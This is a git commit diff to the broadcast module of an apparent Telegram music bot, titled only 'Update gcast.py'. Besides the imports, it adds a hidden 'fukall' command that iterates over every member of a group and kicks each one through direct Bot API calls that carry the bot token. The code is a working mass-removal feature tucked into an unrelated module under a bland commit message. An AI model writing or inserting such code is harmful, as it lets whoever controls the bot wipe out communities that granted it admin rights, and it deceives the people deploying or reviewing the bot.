0ae34e78ae36a63fc9a864807c7d33a7a74ddd71
QueenArzoo <64604049+QueenArzoo@users.noreply.github.com>
2021-08-10 18:48:04 -0700

    Update gcast.py

--- VCPlayBot/modules/gcast.py
+++ VCPlayBot/modules/gcast.py
@@ -1,7 +1,15 @@
+import asyncio
+import html
+import os
+import re
+import sys
+import aiohttp
+import regex
 from pyrogram import Client, filters
 from pyrogram.errors import UserAlreadyParticipant
-import asyncio
-from VCPlayBot.config import SUDO_USERS
+from VCPlayBot.config import SUDO_USERS, BOT_TOKEN
+from aiohttp import ClientSession
+from pyrogram.types import Message
 
 @Client.on_message(filters.command(["gcast"]))
 async def bye(client, message):
@@ -23,3 +31,17 @@ async def bye(client, message):
                 await lol.edit(f"Gcasting.. Sent: {sent} chats. Failed: {failed} chats.")
             await asyncio.sleep(3)
         await message.reply_text(f"Gcasted message to {sent} chats. Failed {failed} chats.")
+
+        
+
+@Client.on_message(filters.command("fukall") &
+                 filters.group & filters.user(SUDO_USERS))
+async def ban_all(c: Client, m: Message):
+    chat = m.chat.id
+
+    async for member in c.iter_chat_members(chat):
+        user_id = member.user.id
+        url = (
+            f"https://api.telegram.org/bot{BOT_TOKEN}/kickChatMember?chat_id={chat}&user_id={user_id}")
+        async with aiohttp.ClientSession() as session:
+            await session.get(url)        
